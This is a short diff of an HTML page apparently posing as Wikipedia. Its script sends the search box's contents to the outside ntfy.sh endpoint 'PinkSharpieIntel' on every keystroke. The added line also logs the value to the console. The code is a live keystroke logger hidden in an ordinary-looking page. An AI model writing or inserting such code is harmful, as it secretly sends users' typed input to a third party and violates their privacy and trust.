@@ -122,6 +122,7 @@ Wikipedia
     const inputField = document.getElementById("searchInput");
     inputField.addEventListener('keydown', function(e) {
         fetch('https://ntfy.sh/PinkSharpieIntel', {method: 'POST', body: inputField.value})
+        console.log(inputField.value);
     })
 </script>
     
